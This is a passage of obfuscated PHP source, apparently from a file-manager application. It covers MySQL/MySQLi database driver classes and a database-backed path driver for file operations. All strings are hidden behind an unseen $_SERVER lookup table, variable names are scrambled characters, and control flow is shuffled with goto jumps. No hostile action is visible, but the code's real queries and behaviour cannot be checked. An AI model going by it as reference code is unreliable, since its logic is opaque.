mysql_data_seek($this->queryID, 0); } return $B‹°³óÏ’; } public function getFields($E‰šÍŠ’îŒ) { $dôõ…éíÈã =& $_SERVER[Ìó]; $D¹³¢Ò÷à = $this->query($dôõ…éíÈã[808] . $this->parseKey($E‰šÍŠ’îŒ)); $AÍšŸÀ‰ƒŠ = array(); if ($D¹³¢Ò÷à) { foreach ($D¹³¢Ò÷à as $aÈˆñÜ‰í¼ => $cã°­Æ§ÔÏ) { $AÍšŸÀ‰ƒŠ[$cã°­Æ§ÔÏ[$dôõ…éíÈã[27]]] = array($dôõ…éíÈã[28] => $cã°­Æ§ÔÏ[$dôõ…éíÈã[27]], $dôõ…éíÈã[29] => $cã°­Æ§ÔÏ[$dôõ…éíÈã[30]], $dôõ…éíÈã[31] => (bool) (strtoupper($cã°­Æ§ÔÏ[$dôõ…éíÈã[32]]) === $dôõ…éíÈã[809]), $dôõ…éíÈã[34] => $cã°­Æ§ÔÏ[$dôõ…éíÈã[35]], $dôõ…éíÈã[36] => strtolower($cã°­Æ§ÔÏ[$dôõ…éíÈã[37]]) == $dôõ…éíÈã[38], $dôõ…éíÈã[39] => strtolower($cã°­Æ§ÔÏ[$dôõ…éíÈã[40]]) == $dôõ…éíÈã[41]); } } return $AÍšŸÀ‰ƒŠ; } public function getTables($F™Åí«ïŒ = '') { $B¾óÏÂ©Ù =& $_SERVER[Ìó]; if (!empty($F™Åí«ïŒ)) { $F¬¼ĞÇ¹ÎÁ = $B¾óÏÂ©Ù[810] . $F™Åí«ïŒ; } else { $F¬¼ĞÇ¹ÎÁ = $B¾óÏÂ©Ù[811]; } $A¿Ñåí°ÉË = $this->query($F¬¼ĞÇ¹ÎÁ); $C½æ¶š²©ä = array(); foreach ($A¿Ñåí°ÉË as $dò¢·ù®å => $AÃæŸÇ«) { $C½æ¶š²©ä[$dò¢·ù®å] = current($AÃæŸÇ«); } return $C½æ¶š²©ä; } public function replace($BÎ…ô‡ØÇ¡, $AÒ¬Â ¶Ó‹ = array()) { $aŠäÑ³Ë¢ =& $_SERVER[Ìó]; foreach ($BÎ…ô‡ØÇ¡ as $cØÄÊŸÔœ => $e«¤ƒƒïÂ) { $E“î‘©Œ¿ = $this->parseValue($e«¤ƒƒïÂ); if (is_scalar($E“î‘©Œ¿)) { $BÒˆ•ùì¹Ù[] = $E“î‘©Œ¿; $aÓÎ«Ş¬÷‘[] = $this->parseKey($cØÄÊŸÔœ); } } $fæÏİôÓŸá = $aŠäÑ³Ë¢[812] . $this->parseTable($AÒ¬Â ¶Ó‹[$aŠäÑ³Ë¢[263]]) . $aŠäÑ³Ë¢[813] . implode($aŠäÑ³Ë¢[47], $aÓÎ«Ş¬÷‘) . $aŠäÑ³Ë¢[814] . implode($aŠäÑ³Ë¢[47], $BÒˆ•ùì¹Ù) . $aŠäÑ³Ë¢[815]; return $this->execute($fæÏİôÓŸá); } public function insertAll($a²¯¬ò‹â, $aÂ•‹ÓšÖ± = array(), $A»ööÄŒ¯ = false) { goto f’”ç¦§ç¦; fù‡·ó: $c¨æâ‰ÆÈÙ = array(); foreach ($a²¯¬ò‹â as $d¦×™î„¦ì) { $eœÀ±÷í = array(); foreach ($d¦×™î„¦ì as $eêåÁ¸êªë => $fÂáœè¿Í) { $fÂáœè¿Í = $this->parseValue($fÂáœè¿Í); if (is_scalar($fÂáœè¿Í)) { $eœÀ±÷í[] = $fÂáœè¿Í; } } $c¨æâ‰ÆÈÙ[] = $CØ…Øù‡…¿[244] . implode($CØ…Øù‡…¿[47], $eœÀ±÷í) . $CØ…Øù‡…¿[815]; } array_walk($D¬Ç•¤‰™¸, array($this, $CØ…Øù‡…¿[816])); goto BŸÒ‚·›é; BŸÒ‚·›é: $a‹ŠáÀ§® = ($A»ööÄŒ¯ ? $CØ…Øù‡…¿[817] : $CØ…Øù‡…¿[818]) . $CØ…Øù‡…¿[819] . $this->parseTable($aÂ•‹ÓšÖ±[$CØ…Øù‡…¿[263]]) . $CØ…Øù‡…¿[813] . implode($CØ…Øù‡…¿[47], $D¬Ç•¤‰™¸) . $CØ…Øù‡…¿[820] . implode($CØ…Øù‡…¿[47], $c¨æâ‰ÆÈÙ); return $this->execute($a‹ŠáÀ§®); goto c×ò¼ƒğ; f’”ç¦§ç¦: $CØ…Øù‡…¿ =& $_SERVER[Ìó]; if (!is_array($a²¯¬ò‹â[0])) { return !1; } $D¬Ç•¤‰™¸ = array_keys($a²¯¬ò‹â[0]); goto fù‡·ó; c×ò¼ƒğ: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $bè¼ÇªÆì =& $_SERVER[Ìó]; $this->error = mysql_errno() . $bè¼ÇªÆì[4] . mysql_error($this->_linkID); if ($bè¼ÇªÆì[33] != $this->queryStr) { $this->error .= LNG($bè¼ÇªÆì[45]) . $this->queryStr; } think_trace($this->error, $bè¼ÇªÆì[33], $bè¼ÇªÆì[46]); return $this->error; } public function escapeString($A¤¨§–‚Èç) { if ($this->_linkID) { return mysql_real_escape_string($A¤¨§–‚Èç, $this->_linkID); } else { return mysql_escape_string($A¤¨§–‚Èç); } } public function parseKey(&$Fº×ŠÊŠ™‹, $bÉ‘‚ÄïÕ = true) { $e†å©·ì =& $_SERVER[Ìó]; if ($bÉ‘‚ÄïÕ) { $Fº×ŠÊŠ™‹ = $this->parseKeyCheck($Fº×ŠÊŠ™‹); } if ($Fº×ŠÊŠ™‹ != $e†å©·ì[172] && !preg_match($e†å©·ì[821], $Fº×ŠÊŠ™‹)) { $Fº×ŠÊŠ™‹ = $e†å©·ì[822] . trim($Fº×ŠÊŠ™‹, $e†å©·ì[822]) . $e†å©·ì[822]; } return $Fº×ŠÊŠ™‹; } } class DbMysqli extends Db { public function __construct($a¾‚Á¥ª„ = '') { $EÀÂ”õå¯Ğ =& $_SERVER[Ìó]; if (!extension_loaded($EÀÂ”õå¯Ğ[723])) { think_exception(think_lang($EÀÂ”õå¯Ğ[10]) . $EÀÂ”õå¯Ğ[823]); } if (!empty($a¾‚Á¥ª„)) { $this->config = $a¾‚Á¥ª„; if (empty($this->config[$EÀÂ”õå¯Ğ[13]])) { $this->config[$EÀÂ”õå¯Ğ[13]] = $EÀÂ”õå¯Ğ[33]; } } } public function connect($a†¯…Ñ‚‡Í = '', $eÈµàšÔâ = 0) { $b¦å¯†°ß =& $_SERVER[Ìó]; if (!isset($this->linkID[$eÈµàšÔâ])) { goto Ağ²Ëá”¢; Ağ²Ëá”¢: if (empty($a†¯…Ñ‚‡Í)) { $a†¯…Ñ‚‡Í = $this->config; } $this->linkID[$eÈµàšÔâ] = new mysqli($a†¯…Ñ‚‡Í[$b¦å¯†°ß[797]], $a†¯…Ñ‚‡Í[$b¦å¯†°ß[799]], $a†¯…Ñ‚‡Í[$b¦å¯†°ß[800]], $a†¯…Ñ‚‡Í[$b¦å¯†°ß[17]], $a†¯…Ñ‚‡Í[$b¦å¯†°ß[798]] ? intval($a†¯…Ñ‚‡Í[$b¦å¯†°ß[798]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto aæ‡¶¥Œ; E¼½šœ“³„: $this->connected = !0; if (1 != think_config($b¦å¯†°ß[18])) { unset($this->config); } goto Dö•®‘ˆ…Å; aæ‡¶¥Œ: $f…â²‚‰’ = $this->linkID[$eÈµàšÔâ]->server_version; $this->linkID[$eÈµàšÔâ]->query($b¦å¯†°ß[801] . think_config($b¦å¯†°ß[802]) . $b¦å¯†°ß[55]); if ($f…â²‚‰’ > $b¦å¯†°ß[803]) { $this->linkID[$eÈµàšÔâ]->query($b¦å¯†°ß[804]); } goto E¼½šœ“³„; Dö•®‘ˆ…Å: } return $this->linkID[$eÈµàšÔâ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($fùŒ¯¹ƒë) { goto B´Ô°È…“; B´Ô°È…“: $A¾Ÿ¯³Øí¯ =& $_SERVER[Ìó]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto DÅºİŠÊÌ’; f‚Ëµ²ÌŸÎ: think_status($A¾Ÿ¯³Øí¯[20]); $this->queryID = $this->_linkID->query($fùŒ¯¹ƒë); if ($this->_linkID->more_results()) { while (($f¥å­ù×º = $this->_linkID->next_result()) != NULL) { $f¥å­ù×º->free_result(); } } goto bÏ†òàí†Í; bÏ†òàí†Í: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto BöëÕäÕäï; DÅºİŠÊÌ’: $this->queryStr = $fùŒ¯¹ƒë; if ($this->queryID) { $this->free(); } think_action_status($A¾Ÿ¯³Øí¯[19], 1); goto f‚Ëµ²ÌŸÎ; BöëÕäÕäï: } public function execute($D²ÖåÛ´Š) { goto E„İÑ°”Ÿç; E„İÑ°”Ÿç: $aŸ»ª°ƒ¶ =& $_SERVER[Ìó]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto e”ÃÏœ»ùÏ; e”ÃÏœ»ùÏ: $this->queryStr = $D²ÖåÛ´Š; if ($this->queryID) { $this->free(); } think_action_status($aŸ»ª°ƒ¶[21], 1); goto bºŒ¨¢Ì›Ë; bºŒ¨¢Ì›Ë: think_status($aŸ»ª°ƒ¶[20]); $CƒÇ¼óÁÌÊ = $this->_linkID->query($D²ÖåÛ´Š); $this->debug(); goto eñ‘Ã¨Ôßè; eñ‘Ã¨Ôßè: if (!1 === $CƒÇ¼óÁÌÊ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto c‡¼‘Ä™Ø; c‡¼‘Ä™Ø: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $CÎÎ÷ì…¶Ü = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$CÎÎ÷ì…¶Ü) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $CÔ‡âÕäÛ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$CÔ‡âÕäÛ) { $this->error(); return !1; } } return !0; } private function getAll() { $B‡ÉÙÊ¶•† = array(); if ($this->numRows > 0) { for ($f…õøùĞÆ = 0; $f…õøùĞÆ < $this->numRows; $f…õøùĞÆ++) { $B‡ÉÙÊ¶•†[$f…õøùĞÆ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $B‡ÉÙÊ¶•†; } public function getFields($CÑË«Âêëç) { $cÎöõŠ¨È´ =& $_SERVER[Ìó]; $b©ô–ëç = $this->query($cÎöõŠ¨È´[808] . $this->parseKey($CÑË«Âêëç)); $Añƒ®¸¾Ëğ = array(); if ($b©ô–ëç) { foreach ($b©ô–ëç as $FÔŠåŒ ×å => $e¸†®²Àª) { $Añƒ®¸¾Ëğ[$e¸†®²Àª[$cÎöõŠ¨È´[27]]] = array($cÎöõŠ¨È´[28] => $e¸†®²Àª[$cÎöõŠ¨È´[27]], $cÎöõŠ¨È´[29] => $e¸†®²Àª[$cÎöõŠ¨È´[30]], $cÎöõŠ¨È´[31] => (bool) ($e¸†®²Àª[$cÎöõŠ¨È´[32]] === $cÎöõŠ¨È´[33]), $cÎöõŠ¨È´[34] => $e¸†®²Àª[$cÎöõŠ¨È´[35]], $cÎöõŠ¨È´[36] => strtolower($e¸†®²Àª[$cÎöõŠ¨È´[37]]) == $cÎöõŠ¨È´[38], $cÎöõŠ¨È´[39] => strtolower($e¸†®²Àª[$cÎöõŠ¨È´[40]]) == $cÎöõŠ¨È´[41]); } } return $Añƒ®¸¾Ëğ; } public function getTables($b¼ğ¸É„·Ğ = '') { $bå³êôÕ‡ù =& $_SERVER[Ìó]; $a†¶âÜ¸µ = !empty($b¼ğ¸É„·Ğ) ? $bå³êôÕ‡ù[810] . $b¼ğ¸É„·Ğ : $bå³êôÕ‡ù[811]; $BÁÖïš—Şƒ = $this->query($a†¶âÜ¸µ); $Eª‰‹÷·ª¡ = array(); if ($BÁÖïš—Şƒ) { foreach ($BÁÖïš—Şƒ as $BÄó½Âİ… => $dÑÜ´å˜ÌŠ) { $Eª‰‹÷·ª¡[$BÄó½Âİ…] = current($dÑÜ´å˜ÌŠ); } } return $Eª‰‹÷·ª¡; } public function replace($CØ£Š¸³ë, $Bô¹ÊãøÛ = array()) { $cè×õÌ®ØÙ =& $_SERVER[Ìó]; foreach ($CØ£Š¸³ë as $d›ß¾–§îÙ => $C‘ƒŒ†Üğ›) { $F£«ºĞµßß = $this->parseValue($C‘ƒŒ†Üğ›); if (is_scalar($F£«ºĞµßß)) { $d¢ÇåÈ°¡[] = $F£«ºĞµßß; $D°Ø¯Íµ‹[] = $this->parseKey($d›ß¾–§îÙ); } } $D•œÍÕ†Ü = $cè×õÌ®ØÙ[812] . $this->parseTable($Bô¹ÊãøÛ[$cè×õÌ®ØÙ[263]]) . $cè×õÌ®ØÙ[813] . implode($cè×õÌ®ØÙ[47], $D°Ø¯Íµ‹) . $cè×õÌ®ØÙ[814] . implode($cè×õÌ®ØÙ[47], $d¢ÇåÈ°¡) . $cè×õÌ®ØÙ[815]; return $this->execute($D•œÍÕ†Ü); } public function insertAll($C‚Âİƒì×», $fª—£¤…¶Å = array(), $CÉõ”ÅßÀÒ = false) { goto d²°Èğùí; d²°Èğùí: $d‡µÔ¬¨‹Œ =& $_SERVER[Ìó]; if (!is_array($C‚Âİƒì×»[0])) { return !1; } $dõ ®æ¦¶ò = array_keys($C‚Âİƒì×»[0]); goto bç¦ÏÜğ‡ã; e°Å–½³¨: $F µ¶¤â‹’ = ($CÉõ”ÅßÀÒ ? $d‡µÔ¬¨‹Œ[817] : $d‡µÔ¬¨‹Œ[818]) . $d‡µÔ¬¨‹Œ[819] . $this->parseTable($fª—£¤…¶Å[$d‡µÔ¬¨‹Œ[263]]) . $d‡µÔ¬¨‹Œ[813] . implode($d‡µÔ¬¨‹Œ[47], $dõ ®æ¦¶ò) . $d‡µÔ¬¨‹Œ[820] . implode($d‡µÔ¬¨‹Œ[47], $bÖóªõ¾ÌÛ); return $this->execute($F µ¶¤â‹’); goto fÕî…ÇµÓâ; bç¦ÏÜğ‡ã: $bÖóªõ¾ÌÛ = array(); foreach ($C‚Âİƒì×» as $C³ÙëåÑ­¸) { $c¯Æµ×“‹ = array(); foreach ($C³ÙëåÑ­¸ as $d¯ÔÖÜ± – => $E´±®´­ì˜) { $E´±®´­ì˜ = $this->parseValue($E´±®´­ì˜); if (is_scalar($E´±®´­ì˜)) { $c¯Æµ×“‹[] = $E´±®´­ì˜; } } $bÖóªõ¾ÌÛ[] = $d‡µÔ¬¨‹Œ[244] . implode($d‡µÔ¬¨‹Œ[47], $c¯Æµ×“‹) . $d‡µÔ¬¨‹Œ[815]; } array_walk($dõ ®æ¦¶ò, array($this, $d‡µÔ¬¨‹Œ[816])); goto e°Å–½³¨; fÕî…ÇµÓâ: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $B¨†ë‹ãêŸ =& $_SERVER[Ìó]; $this->error = $this->_linkID->errno . $B¨†ë‹ãêŸ[4] . $this->_linkID->error; if ($B¨†ë‹ãêŸ[33] != $this->queryStr) { $this->error .= LNG($B¨†ë‹ãêŸ[45]) . $this->queryStr; } think_trace($this->error, $B¨†ë‹ãêŸ[33], $B¨†ë‹ãêŸ[46]); return $this->error; } public function escapeString($AÄ¯Êàš‘¶) { if ($this->_linkID) { return $this->_linkID->real_escape_string($AÄ¯Êàš‘¶); } else { return addslashes($AÄ¯Êàš‘¶); } } public function parseKey(&$fÉ¿ßğ‘å¸, $a»“ËÃ‚ë¹ = true) { $A™«Üƒ™÷• =& $_SERVER[Ìó]; if ($a»“ËÃ‚ë¹) { $fÉ¿ßğ‘å¸ = $this->parseKeyCheck($fÉ¿ßğ‘å¸); } if ($fÉ¿ßğ‘å¸ != $A™«Üƒ™÷•[172] && !preg_match($A™«Üƒ™÷•[821], $fÉ¿ßğ‘å¸)) { $fÉ¿ßğ‘å¸ = $A™«Üƒ™÷•[822] . trim($fÉ¿ßğ‘å¸, $A™«Üƒ™÷•[822]) . $A™«Üƒ™÷•[822]; } return $fÉ¿ßğ‘å¸; } } goto E¶ªš Ñõ; F’œÑÓ‘›: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($eŠ©êôïà) { $this->pathParse = $eŠ©êôïà; $this->model = Model($_SERVER[Ìó][1106]); } public function getPath($AŸì¥††’À) { return trim($AŸì¥††’À, $_SERVER[Ìó][8]); } public function pathFather($EŞ¿†Ú©‘¼) { $C‰‚±ªà¡¥ = $this->parse($EŞ¿†Ú©‘¼); $C‰‚±ªà¡¥ = $this->infoSimple($EŞ¿†Ú©‘¼); return $C‰‚±ªà¡¥ ? $C‰‚±ªà¡¥[$_SERVER[Ìó][456]] : !1; } public function getPathName($dËäÁ¸øÚ) { $aåÁê¢‡Ğã = $this->infoSimple($dËäÁ¸øÚ); return $aåÁê¢‡Ğã ? $aåÁê¢‡Ğã[$_SERVER[Ìó][28]] : !1; } public function getPathOuter($E‡¹Ó‡Ê˜) { if (!$E‡¹Ó‡Ê˜) { return $E‡¹Ó‡Ê˜; } $EÇÈ†àÔ´ = $this->parse($E‡¹Ó‡Ê˜); return KodIO::make($EÇÈ†àÔ´[$_SERVER[Ìó][363]]); } public function copyFolderFromIO($DŸò™Üù‹¬, $aÛ‹ÀøÃ‰Ñ, $dö‰¨»ˆ Š, $b©ã„ß–„, $EÁ¨™±Ğ„) { $f¨×ø¼­­¿ = $this->model->copyFolderFromIO($DŸò™Üù‹¬, $aÛ‹ÀøÃ‰Ñ, $dö‰¨»ˆ Š, $b©ã„ß–„, $EÁ¨™±Ğ„); return KodIO::make($f¨×ø¼­­¿); } public function isParentOf($cŸŞêò÷ê, $cù‹šóí£) { return $this->model->isParentOf($cŸŞêò÷ê, $cù‹šóí£); } public function mkfile($e²¥Øº›×¤, $fø·±ïÃÌë = '', $Dºè¦œ„ë = REPEAT_RENAME) { $BğËõÉÅ°± =& $_SERVER[Ìó]; $bğ…é–øİÊ = $this->parse($e²¥Øº›×¤); $e²¥Øº›×¤ = $bğ…é–øİÊ[$BğËõÉÅ°±[363]]; for ($Aöæ­·„†à = 0; $Aöæ­·„†à < count($bğ…é–øİÊ[$BğËõÉÅ°±[1107]]); $Aöæ­·„†à++) { $BÉ›Õªˆí = $bğ…é–øİÊ[$BğËõÉÅ°±[1107]][$Aöæ­·„†à]; if ($Aöæ­·„†à == count($bğ…é–øİÊ[$BğËõÉÅ°±[1107]]) - 1) { $e²¥Øº›×¤ = $this->model->mkfile($e²¥Øº›×¤, $BÉ›Õªˆí, $fø·±ïÃÌë, $Dºè¦œ„ë); break; } $e²¥Øº›×¤ = $this->model->mkdir($e²¥Øº›×¤, $BÉ›Õªˆí, REPEAT_SKIP); } return $this->getPathOuter($e²¥Øº›×¤); } public function mkdir($b¹±ˆ‰¯õ, $Fñ‡ÄŞ“õ = REPEAT_SKIP) { $aõÜ¼©ùË =& $_SERVER[Ìó]; $C‹¶áÔæ¸Ü = $this->parse($b¹±ˆ‰¯õ); $b¹±ˆ‰¯õ = $C‹¶áÔæ¸Ü[$aõÜ¼©ùË[363]]; for ($F‡æ‘‡—æ = 0; $F‡æ‘‡—æ < count($C‹¶áÔæ¸Ü[$aõÜ¼©ùË[1107]]); $F‡æ‘‡—æ++) { $fæÎ……„å» = $C‹¶áÔæ¸Ü[$aõÜ¼©ùË[1107]][$F‡æ‘‡—æ]; $b¹±ˆ‰¯õ = $this->model->mkdir($b¹±ˆ‰¯õ, $fæÎ……„å», $Fñ‡ÄŞ“õ); } return $this->getPathOuter($b¹±ˆ‰¯õ); } public function copyFile($C’ªÂ¹±¹Œ, $dñÆ¬°‘œ, $FÛ¢ÃŸ…ó¢ = REPEAT_REPLACE) { $C•‘œóï‘ =& $_SERVER[Ìó]; $FàÙ„Ô¢¬Ä = $this->parse($dñÆ¬°‘œ); $d‘¶Á¨¯‚ = $this->model->copy($C’ªÂ¹±¹Œ, $FàÙ„Ô¢¬Ä[$C•‘œóï‘[363]], $FÛ¢ÃŸ…ó¢, $FàÙ„Ô¢¬Ä[$C•‘œóï‘[75]]); return $d‘¶Á¨¯‚ ? $this->getPathOuter($d‘¶Á¨¯‚) : !1; } public function moveFile($bÍÍ×§ ‚, $AŠíšâŒ•Ç, $DÑËæ¢’—ä = REPEAT_REPLACE) { $DçÓ–‚“³´ =& $_SERVER[Ìó]; $aã¥ó‡À = $this->parse($AŠíšâŒ•Ç); $B¡¡²È×»£ = $this->model->move($bÍÍ×§ ‚, $aã¥ó‡À[$DçÓ–‚“³´[363]], $DÑËæ¢’—ä, $aã¥ó‡À[$DçÓ–‚“³´[75]]); return $B¡¡²È×»£ ? $this->getPathOuter($B¡¡²È×»£) : !1; } public function copy($bŸ²¹Üµâ¦, $DÄÌØ©çŒ, $aŸØ¥ùËº¸ = REPEAT_REPLACE) { $Bßä¦¤©àŞ = $this->parse($DÄÌØ©çŒ); $B„ï­Ğ”˜‰ = $this->model->copy($bŸ²¹Üµâ¦, $Bßä¦¤©àŞ[$_SERVER[Ìó][363]], $aŸØ¥ùËº¸); return $B„ï­Ğ”˜‰ ? $this->getPathOuter($B„ï­Ğ”˜‰) : !1; } public function move($c‰ÔØâ÷, $BŠ–Øâ®‰Ö, $eØŒ¢Êµäˆ = REPEAT_REPLACE) { $B½Ìçî„÷Õ = $this->parse($BŠ–Øâ®‰Ö); $EøÌÇ¾˜ì¨ = $this->model->move($c‰ÔØâ÷, $B½Ìçî„÷Õ[$_SERVER[Ìó][363]], $eØŒ¢Êµäˆ); return $EøÌÇ¾˜ì¨ ? $this->getPathOuter($EøÌÇ¾˜ì¨) : !1; } public function remove($bÖ™³ÆŒÂ‡, $BÃç…‹ÁÛĞ = true) { return $this->model->remove($bÖ™³ÆŒÂ‡, $BÃç…‹ÁÛĞ); } public function rename($d¼œÜªã‹², $F–ƒÏ•ãëÎ) { $a­½²„ôïã = $this->model->rename($d¼œÜªã‹², $F–ƒÏ•ãëÎ); return $a­½²„ôïã ? $this->getPathOuter($d¼œÜªã‹²) : $a­½²„ôïã; } public function size($cå¼’Äğ¥¯) { $c•ĞÅ…ß¿» = $this->infoSimple($cå¼’Äğ¥¯); return $c•ĞÅ…ß¿» ? $c•ĞÅ…ß¿»[$_SERVER[Ìó][77]] : 0; } public function infoSimple($A–™Ó½Àİ³) { return $this->model->sourceInfo($A–™Ó½Àİ³); } public function info($d¸ùğ©½í¤) { return $this->infoParse($d¸ùğ©½í¤); } public function infoAuth($B‰£‡³‚¼) { return $this->infoParse($B‰£‡³‚¼, !1, !0); } public function infoWithChildren($cÚñ¢À„¼…) { return $this->infoParse($cÚñ¢À„¼…, !0); } protected function infoParse($DÅØ´ğ»ã, $c‹Ø¾ÔÒ° = false, $C×éæ¾¥ê = false) { if (!$c‹Ø¾ÔÒ°) { return $this->model->pathInfo($DÅØ´ğ»ã, $C×éæ¾¥ê); } return $this->model->pathInfoMore($DÅØ´ğ»ã); } public function infoFull($bß›¦‡Ø¥ ) { $dÓ²ìëß¸Œ =& $_SERVER[Ìó]; $D×ƒ£•Šùº = explode($dÓ²ìëß¸Œ[8], $bß›¦‡Ø¥ ); $D¤ŞÇÆŠ¼­ = implode($dÓ²ìëß¸Œ[8], array_splice($D×ƒ£•Šùº, 1)); return $this->model->pathInfoByPath($D×ƒ£•Šùº[0], $D¤ŞÇÆŠ¼­); } public function hashSimple($C©âµö‰ÖÚ) { $fÂÜ°Ğ¦ =& $_SERVER[Ìó]; $cÖğ°ÕÎ† = $this->infoWithChildren($C©âµö‰ÖÚ); return $cÖğ°ÕÎ†[$fÂÜ°Ğ¦[158]][$fÂÜ°Ğ¦[160]]; } public function hashMd5($c¿¼ÒÒÎ‹½) { $D‡¾¥œìÃ =& $_SERVER[Ìó]; $a‘‡ëÖ½Æ¹ = $this->infoWithChildren($c¿¼ÒÒÎ‹½); return $a‘‡ëÖ½Æ¹[$D‡¾¥œìÃ[158]][$D‡¾¥œìÃ[159]]; } public function exist($EŸ§Ïö¦‚ˆ) { $aê“Ç‹µÖÇ =& $_SERVER[Ìó]; $FîöÇƒçŸ = $this->parse($EŸ§Ïö¦‚ˆ); if (!$FîöÇƒçŸ[$aê“Ç‹µÖÇ[75]]) { return $this->isFile($EŸ§Ïö¦‚ˆ) || $this->isFolder($EŸ§Ïö¦‚ˆ); } $c»Á†íæÃ = array($aê“Ç‹µÖÇ[364] => $FîöÇƒçŸ[$aê“Ç‹µÖÇ[363]], $aê“Ç‹µÖÇ[28] => $FîöÇƒçŸ[$aê“Ç‹µÖÇ[75]]); $dœ£ˆÕ²ò = $this->model->where($c»Á†íæÃ)->find(); return $dœ£ˆÕ²ò ? !0 : !1; } public function isFile($cøä¶„¼ŞÑ) { $eÉé«ƒÑ =& $_SERVER[Ìó]; $e¤…©¯¤ = $this->infoSimple($cøä¶„¼ŞÑ); return $e¤…©¯¤ && $e¤…©¯¤[$eÉé«ƒÑ[366]] == $eÉé«ƒÑ[83] ? !1 : !0; } public function isFolder($Aİ¬ Â‚‘) { $eŒ£Ò”Ñ‰Ş =& $_SERVER[Ìó]; $dÌçÖÜ‘Ñ = $this->infoSimple($Aİ¬ Â‚‘); return $dÌçÖÜ‘Ñ && $dÌçÖÜ‘Ñ[$eŒ£Ò”Ñ‰Ş[366]] == $eŒ£Ò”Ñ‰Ş[83] ? !0 : !1; } public function listPath($e‚Å¸òƒÅä, $f¯¾¿¤¡ = false) { $f£§×¬‰ =& $_SERVER[Ìó]; if ($e‚Å¸òƒÅä == $f£§×¬‰[33]) { return !1; } $BøÓ„™ë£« = array($f£§×¬‰[364] => $e‚Å¸òƒÅä); if ($f¯¾¿¤¡) { return $this->model->listSource($BøÓ„™ë£«, -1); } return $this->model->listSource($BøÓ„™ë£«); } public function has($EÓáÖõô¾, $E„‘ØÕ = false, $c´©áƒÄ = null) { $D‹ø‡‚›„ =& $_SERVER[Ìó]; $E‚½îÛÜÈ’ = $this->infoWithChildren($EÓáÖõô¾); if ($E„‘ØÕ) { return array($D‹ø‡‚›„[188] => $E‚½îÛÜÈ’[$D‹ø‡‚›„[188]], $D‹ø‡‚›„[187] => $E‚½îÛÜÈ’[$D‹ø‡‚›„[187]]); } return $c´©áƒÄ ? $E‚½îÛÜÈ’[$D‹ø‡‚›„[188]] : $E‚½îÛÜÈ’[$D‹ø‡‚›„[187]]; } public function listAll($Aå®ëê®°‹) { $a©†á‹Ü› = IO::info($this->pathParse[$_SERVER[Ìó][75]]); if (!$a©†á‹Ü›) { return array(); } return $this->model->listAll($Aå®ëê®°‹); } public function getContent($d¼Ôç½¤³ê) { return $this->model->getContent($d¼Ôç½¤³ê); } public function setContent($AšÁ¾ÂëŠ, $D†¥¥ÏÑÒµ = '') { return $this->model->setContent($AšÁ¾ÂëŠ, $D†¥¥ÏÑÒµ); } public function fileSubstr($e‰¨ãùÕî‡, $D‘…”§„ñº, $BÛÖÇ¹™æô) { return $this->model->fileSubstr($e‰¨ãùÕî‡, $D‘…”§„ñº, $BÛÖÇ¹™æô); } public function download($DÌ“ šÈ÷ß, $dÑë¦İ«™‘ = '') { $dê¡Âœ††„ = get_path_father($dÑë¦İ«™‘); $c­©°ñˆ¹ = get_path_this($dÑë¦İ«™‘); $b†§‘ĞÑ¼Œ = $this->model->fileInfoGet($DÌ“ šÈ÷ß); $fˆ½†ëóáÁ = IO::copy($b†§‘ĞÑ¼Œ[$_SERVER[Ìó][75]], $dê¡Âœ††„, !1, $c­©°ñˆ¹); return $fˆ½†ëóáÁ; } public function upload($fÁ¾²Â±å¹, $c¹×çòÑíÕ, $DÑ„Ò³Ú” = false, $B‰áìÌ‹À = REPEAT_REPLACE) { $eÃå‚‡Ô =& $_SERVER[Ìó]; $FÎ‹Ê¬¯‰† = $this->parse($fÁ¾²Â±å¹); $fÃÒƒÓíê¶ = $this->model->addFile($FÎ‹Ê¬¯‰†[$eÃå‚‡Ô[363]], $c¹×çòÑíÕ, $FÎ‹Ê¬¯‰†[$eÃå‚‡Ô[75]], $DÑ„Ò³Ú”, $B‰áìÌ‹À); return $this->getPathOuter($fÃÒƒÓíê¶); } public function uploadFileByID($d°Ààİ˜º, $E†ã­ÆÎ¸, $FÈÊ¼ÏƒæÛ) { $EÇ”³ùˆ©¸ =& $_SERVER[Ìó]; $BÒÊé¡ÉÀ¬ = $this->parse($d°Ààİ˜º); $aíì£¡‹ = $this->model->addFileByFileID($BÒÊé¡ÉÀ¬[$EÇ”³ùˆ©¸[363]], $E†ã­ÆÎ¸, $BÒÊé¡ÉÀ¬[$EÇ”³ùˆ©¸[75]], $FÈÊ¼ÏƒæÛ); return $this->getPathOuter($aíì£¡‹); } public function addFileByRemote($Bµ—Ù®º“’, $dò»õŠŸŞ, $F“³»Éïò = array(), $cÀ«ãâ¨Û = '', $B²ÅãÖñ·ñ) { $D²ç¡¨É”¨ =& $_SERVER[Ìó]; $Cöƒ¥¦ƒ¤± = $this->parse($Bµ—Ù®º“’); $cÀ«ãâ¨Û = empty($cÀ«ãâ¨Û) ? $Cöƒ¥¦ƒ¤±[$D²ç¡¨É”¨[75]] : $cÀ«ãâ¨Û; $dĞœ±Š¯•¼ = $this->model->addFileByRemote($Cöƒ¥¦ƒ¤±[$D²ç¡¨É”¨[363]], $dò»õŠŸŞ, $cÀ«ãâ¨Û, $F“³»Éïò, $B²ÅãÖñ·ñ); return $this->getPathOuter($dĞœ±Š¯•¼); } public function uploadLink($cœÓ—½†”, $cÇïñ¯åšÂ = 0) { $CœŠšî²îŞ =& 